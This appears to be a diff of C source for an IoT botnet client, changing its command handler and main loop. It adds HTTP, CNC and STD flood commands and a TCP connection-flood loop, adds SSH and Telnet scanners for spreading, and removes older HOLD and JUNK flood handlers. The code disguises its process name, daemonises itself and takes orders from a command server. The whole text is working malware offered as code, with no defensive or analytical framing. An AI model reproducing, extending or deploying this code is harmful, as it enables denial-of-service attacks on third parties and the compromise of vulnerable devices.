-                                        if(res == 1)
-                                        {
-                                                lon = sizeof(int);
-                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
-                                                if(valopt)
-                                                {
-                                                        close(fds[i].fd);
-                                                        fds[i].state = 0;
-                                                } else {
-                                                        fds[i].state = 2;
-                                                }
-                                        } else if(res == -1)
-                                        {
-                                                close(fds[i].fd);
-                                                fds[i].state = 0;
-                                        }
-                                }
-                                break;
-
-                        case 2:
-                                {
-                                        FD_ZERO(&myset);
-                                        FD_SET(fds[i].fd, &myset);
-                                        tv.tv_sec = 0;
-                                        tv.tv_usec = 10000;
-                                        res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
-                                        if(res != 0)
-                                        {
-                                                close(fds[i].fd);
-                                                fds[i].state = 0;
-                                        }
-                                }
-                                break;
-                        }
-                }
-        }
+	int end = time(NULL) + end_time;
+	int sockfd;
+	struct sockaddr_in server;
+	//sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	
+	server.sin_addr.s_addr = inet_addr(ip);
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+	
+	while(end > time(NULL))
+	{
+		sockfd = socket(AF_INET, SOCK_STREAM, 0);
+		connect(sockfd , (struct sockaddr *)&server , sizeof(server));
+		sleep(1);
+		close(sockfd);
+	}
+	
 }
-
-//   _____  __    ___                _
-//   \_   \/__\  / __\   /\/\   __ _(_)_ __
-//    / /\/ \// / /     /    \ / _` | | '_ \
-// /\/ /_/ _  \/ /___  / /\/\ \ (_| | | | | |
-// \____/\/ \_/\____/  \/    \/\__,_|_|_| |_|
 
 void processCmd(int argc, unsigned char *argv[])
 {
@@ -1435,101 +1977,48 @@ void processCmd(int argc, unsigned char *argv[])
                 sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
                 return;
         }
+		
+		if(!strcmp(argv[0], "SCANNER"))
+		{
+		if(argc != 2)
+		{
+			sockprintf(mainCommSock, "SCANNER SSH/TELNET ON | SSH/TELNET OFF");
+			return;
+		}
 
-        if(!strcmp(argv[0], "SCANNER"))
-        {
-                if(argc != 2)
-                {
-                        sockprintf(mainCommSock, "SCANNER ON | OFF");
-                        return;
-                }
+		if(!strcmp(argv[1], "OFF"))
+		{
+			if(scanPid == 0) return;
+			sockprintf(mainCommSock, "TELNET SCANNER STOPPED\n");
+			kill(scanPid, 9);
+			scanPid = 0;
+		
 
-                if(!strcmp(argv[1], "OFF"))
-                {
-                        if(scanPid == 0) return;
-                        kill(scanPid, 9);
-printf("SCANNER STOPPED!\n");
-                        scanPid = 0;
-                }
+		if(!strcmp(argv[1], "TELNET ON"))
+		{
+			if(scanPid != 0) return;
+			uint32_t parent;
+			parent = fork();
+			sockprintf(mainCommSock, "TELNET SCANNER EXECUTED\n");
+			if (parent > 0) { scanPid = parent; return;}
+			else if(parent == -1) return;
 
-                if(!strcmp(argv[1], "ON"))
-                {
-                        if(scanPid != 0) return;
-                        uint32_t parent;
-                        parent = fork();
-printf("SCANNER STARTED!\n");
-                        if (parent > 0) { scanPid = parent; return;}
-                        else if(parent == -1) return;
+			TelnetScanner(1);
+			_exit(0);
+		}
+		
+		if(!strcmp(argv[1], "SSH ON"))
+		{
+			if(scanPid != 0) return;
+			uint32_t parent;
+			parent = fork();
+			sockprintf(mainCommSock, "SSH SCANNER EXECUTED\n");
+			if (parent > 0) { scanPid = parent; return;}
+			else if(parent == -1) return;
 
-                        StartTheLelz();
-                        _exit(0);
-                }
-        }
-
-        if(!strcmp(argv[0], "HOLD"))
-        {
-                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
-                {
-                        //sockprintf(mainCommSock, "HOLD <ip> <port> <time>");
-                        return;
-                }
-
-                unsigned char *ip = argv[1];
-                int port = atoi(argv[2]);
-                int time = atoi(argv[3]);
-
-                if(strstr(ip, ",") != NULL)
-                {
-                        unsigned char *hi = strtok(ip, ",");
-                        while(hi != NULL)
-                        {
-                                if(!listFork())
-                                {
-                                        sendHOLD(hi, port, time);
-                                        _exit(0);
-                                }
-                                hi = strtok(NULL, ",");
-                        }
-                } else {
-                        if (listFork()) { return; }
-
-                        sendHOLD(ip, port, time);
-                        _exit(0);
-                }
-        }
-
-        if(!strcmp(argv[0], "JUNK"))
-        {
-                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
-                {
-                        //sockprintf(mainCommSock, "JUNK <ip> <port> <time>");
-                        return;
-                }
-
-                unsigned char *ip = argv[1];
-                int port = atoi(argv[2]);
-                int time = atoi(argv[3]);
-
-                if(strstr(ip, ",") != NULL)
-                {
-                        unsigned char *hi = strtok(ip, ",");
-                        while(hi != NULL)
-                        {
-                                if(!listFork())
-                                {
-                                        sendJUNK(hi, port, time);
-                                        close(mainCommSock);
-                                        _exit(0);
-                                }
-                                hi = strtok(NULL, ",");
-                        }
-                } else {
-                        if (listFork()) { return; }
-
-                        sendJUNK(ip, port, time);
-                        _exit(0);
-                }
-        }
+			SSHScanner(1);
+			_exit(0);
+		}}}
 
         if(!strcmp(argv[0], "UDP"))
         {
@@ -1595,15 +2084,119 @@ printf("SCANNER STARTED!\n");
                                 }
                                 hi = strtok(NULL, ",");
                         }
-                } else {
+                } else	{
                         if (listFork()) { return; }
 
                         sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
                         _exit(0);
+						}
+        }
+		if(!strcmp(argv[0], "HTTP"))
+		{
+		if(argc < 3 || atoi(argv[2]) < 1)
+		{
+			return;
+		}
+
+		unsigned char *ip = argv[1];
+		int time = atoi(argv[2]);
+
+		if(strstr(ip, ",") != NULL)
+		{
+			unsigned char *hi = strtok(ip, ",");
+			while(hi != NULL)
+			{
+				if(!listFork())
+				{
+					int i = 0;
+					while(i < 10){
+						sendHTTP(ip, time);
+						i++;
+					}
+					close(mainCommSock);
+					_exit(0);
+				}
+				hi = strtok(NULL, ",");
+			}
+		} else	{
+			if (listFork()) { return; }
+			int i = 0;
+			while(i < 10){
+				sendHTTP(ip, time);
+				i++;
+			}
+			close(mainCommSock);
+
+			_exit(0);
+				}
+		}
+		if(!strcmp(argv[0], "CNC"))
+        {
+                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
+                {
+                        
+                        return;
+                }
+
+                unsigned char *ip = argv[1];
+                int port = atoi(argv[2]);
+                int time = atoi(argv[3]);
+
+                if(strstr(ip, ",") != NULL)
+                {
+                        unsigned char *hi = strtok(ip, ",");
+                        while(hi != NULL)
+                        {
+                                if(!listFork())
+                                {
+                                        sendCNC(hi, port, time);
+                                        close(mainCommSock);
+                                        _exit(0);
+                                }
+                                hi = strtok(NULL, ",");
+                        }
+                } else {
+                        if (listFork()) { return; }
+
+                        sendCNC(ip, port, time);
+                        _exit(0);
                 }
         }
+		
+		if(!strcmp(argv[0], "STD"))
+		{
+			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
+            {
+                        
+                        return;
+            }
+			
+			unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+			
+			if(strstr(ip, ",") != NULL)
+                {
+                        unsigned char *hi = strtok(ip, ",");
+                        while(hi != NULL)
+                        {
+                                if(!listFork())
+                                {
+                                        sendSTD(hi, port, time);
+                                        _exit(0);
+                                }
+                                hi = strtok(NULL, ",");
+                        }
+                } else {
+                        if (listFork()) { return; }
 
-	if(!strcmp(argv[0], "KILLATTK"))
+                        sendSTD(ip, port, time);
+                        _exit(0);
+                }
+			
+		}
+
+		if(!strcmp(argv[0], "KILLATTK"))
         {
                 int killed = 0;
                 unsigned long i;
@@ -1616,9 +2209,9 @@ printf("SCANNER STARTED!\n");
 
                 if(killed > 0)
                 {
-                        sockprintf(mainCommSock, "Killed %d.", killed);
+                        //sockprintf(mainCommSock, "Killed %d.", killed);
                 } else {
-                        sockprintf(mainCommSock, "None Killed.");
+                        //sockprintf(mainCommSock, "None Killed.");
                 }
         }
 
@@ -1712,7 +2305,7 @@ char *getBuild()
 	#elif PPC_BUILD
 	return "POWERPC";
 	#else
-	return "SHENRON";
+	return "DARKAI";
 	#endif
 }
 
@@ -1720,11 +2313,11 @@ int main(int argc, unsigned char *argv[])
 {
         char *mynameis = "";
         if(SERVER_LIST_SIZE <= 0) return 0;
-	printf("BUILD %s\n", getBuild());
-	strncpy(argv[0],"",strlen(argv[0]));
+		printf("BUILD %s\n", getBuild());
+		strncpy(argv[0],"",strlen(argv[0]));
     	argv[0] = "";
     	prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
-	srand(time(NULL) ^ getpid());
+		srand(time(NULL) ^ getpid());
         init_rand(time(NULL) ^ getpid());
         pid_t pid1;
         pid_t pid2;
@@ -1736,14 +2329,14 @@ int main(int argc, unsigned char *argv[])
                         waitpid(pid1, &status, 0);
                         exit(0);
         } else if (!pid1) {
-                        if (pid2 = fork()) {
-                                        exit(0);
-                        } else if (!pid2) {
-                        } else {
-                                        zprintf("fork failed\n");
-                        }
+			if (pid2 = fork()) {
+				exit(0);
+            } else if (!pid2) {
+            } else {
+				zprintf("fork failed\n");
+			}
         } else {
-                        zprintf("fork failed\n");
+			zprintf("fork failed\n");
         }
 
         setsid();
@@ -1755,7 +2348,7 @@ int main(int argc, unsigned char *argv[])
         {
                 if(initConnection()) { sleep(5); continue; }
 
-		sockprintf(mainCommSock, "BUILD %s", getBuild());
+				sockprintf(mainCommSock, "BUILD %s", getBuild());
 
                 char commBuf[4096];
                 int got = 0;
@@ -1817,7 +2410,7 @@ int main(int argc, unsigned char *argv[])
                                         while(fdgets(buf, 1024, command) != NULL)
                                         {
                                                 trim(buf);
-                                                sockprintf(mainCommSock, "%s", buf);
+//                                                sockprintf(mainCommSock, "%s", buf);
                                                 memset(buf, 0, 1024);
                                                 sleep(1);
                                         }
@@ -1854,7 +2447,6 @@ int main(int argc, unsigned char *argv[])
                                 }
                         }
                 }
-                printf("Link closed by server.\n");
         }
 
         return 0;
